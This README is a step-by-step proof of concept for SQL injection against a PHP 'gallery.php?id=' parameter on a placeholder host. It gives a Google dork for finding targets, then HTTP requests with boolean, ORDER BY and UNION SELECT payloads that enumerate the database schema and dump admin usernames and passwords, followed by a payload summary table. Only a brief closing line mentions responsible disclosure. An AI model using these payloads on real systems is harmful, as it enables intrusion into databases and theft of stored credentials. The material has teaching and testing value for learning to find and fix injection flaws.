# Basic SQL Injection Proof of Concept

A step-by-step README demonstrating how to discover and exploit a basic SQL injection vulnerability.

---

## Table of Contents

1. [Introduction](#introduction)  
2. [Prerequisites](#prerequisites)  
3. [Reconnaissance](#reconnaissance)  
4. [Identifying the Injection Point](#identifying-the-injection-point)  
5. [Boolean-Based Testing](#boolean-based-testing)  
6. [Determining Number of Columns](#determining-number-of-columns)  
7. [Finding the Reflective Column](#finding-the-reflective-column)  
8. [Extracting Data](#extracting-data)  
9. [Payload Summary](#payload-summary)  
10. [Responsible Disclosure](#responsible-disclosure)  

---

## Introduction

This README walks through discovering a vulnerable `id` parameter on a PHP page, verifying SQL injection, and extracting data via error-based, boolean-based, and UNION-based techniques.

---

## Prerequisites

- Web browser (or `curl`/`httpie`)  
- Intercepting proxy (e.g., Burp Suite)  
- Knowledge of basic SQL syntax  

---

## Reconnaissance

- Enumerate URLs with tools like `subfinder`, `gau`, `waybackurls`.  
- Fallback to Google dork:  

  ```text
  inurl:"?id=" site:target.com
  ```

- Locate URL:  
  `https://www.target.com/gallery.php?id=1`

---

## Identifying the Injection Point

Send a minimal payload to trigger an SQL error:

```http
GET /gallery.php?id=' HTTP/1.1
Host: www.target.com
```

Result:  
```
SQL Syntax Error: You have an error in your SQL syntax...
```

---

## Boolean-Based Testing

Verify true/false conditions:

```http
GET /gallery.php?id=' OR '1'='1'--+ HTTP/1.1
Host: www.target.com
```

All items return (true).

```http
GET /gallery.php?id=' AND '1'='2'--+ HTTP/1.1
Host: www.target.com
```

No items return (false).

---

## Determining Number of Columns

Use `ORDER BY` to discover column count:

```http
GET /gallery.php?id=1 ORDER BY 1--+ HTTP/1.1  # OK
GET /gallery.php?id=1 ORDER BY 2--+ HTTP/1.1  # OK
...
GET /gallery.php?id=1 ORDER BY 6--+ HTTP/1.1  # ERROR
```

Conclusion: original query uses **5 columns**.

---

## Finding the Reflective Column

Inject distinct marker into each column:

```http
GET /gallery.php?id=1 UNION SELECT
  NULL, NULL, 'ABC_INJECTION', NULL, NULL--+ HTTP/1.1
Host: www.target.com
```

Response includes `ABC_INJECTION`, confirming column 3 is reflected.

---

## Extracting Data

1. **Enumerate Databases**  
   ```http
   GET /gallery.php?id=1 UNION SELECT
     NULL, NULL, group_concat(schema_name), NULL, NULL
     FROM information_schema.schemata--+ HTTP/1.1
   Host: www.target.com
   ```
2. **Enumerate Tables**  
   ```http
   GET /gallery.php?id=1 UNION SELECT
     NULL, NULL, group_concat(table_name), NULL, NULL
     FROM information_schema.tables
     WHERE table_schema='target_db'--+ HTTP/1.1
   Host: www.target.com
   ```
3. **Enumerate Columns of a Specific Table**  
   ```http
   GET /gallery.php?id=1 UNION SELECT
     NULL, NULL, group_concat(column_name), NULL, NULL
     FROM information_schema.columns
     WHERE table_name='admin'--+ HTTP/1.1
   Host: www.target.com
   ```
4. **Dump Sensitive Data**  
   ```http
   GET /gallery.php?id=1 UNION SELECT
     NULL, NULL, group_concat(username,0x3a,password), NULL, NULL
     FROM target_db.admin--+ HTTP/1.1
   Host: www.target.com
   ```

---

## Payload Summary

| Step                          | Payload                                                                      |
|-------------------------------|-------------------------------------------------------------------------------|
| Error-Based Test              | `'?`                                                                         |
| Boolean-Based (True)          | `' OR '1'='1'--+`                                                             |
| Boolean-Based (False)         | `' AND '1'='2'--+`                                                            |
| ORDER BY Column Count         | `1 ORDER BY N--+` (increment N until error)                                   |
| UNION SELECT with Marker      | `1 UNION SELECT NULL,NULL,'ABC',NULL,NULL--+`                                 |
| Enumerate Schemas             | `UNION SELECT NULL,NULL,group_concat(schema_name),NULL,NULL--+`               |
| Enumerate Tables              | `UNION SELECT NULL,NULL,group_concat(table_name),NULL,NULL WHERE ...--+`      |
| Enumerate Columns             | `UNION SELECT NULL,NULL,group_concat(column_name),NULL,NULL WHERE ...--+`     |
| Dump Admin Data               | `UNION SELECT NULL,NULL,group_concat(username,0x3a,password),NULL,NULL--+`    |

---

## Responsible Disclosure

After confirming impact, report the vulnerability details to the target’s security team via their Vulnerability Disclosure Program (VDP).

---

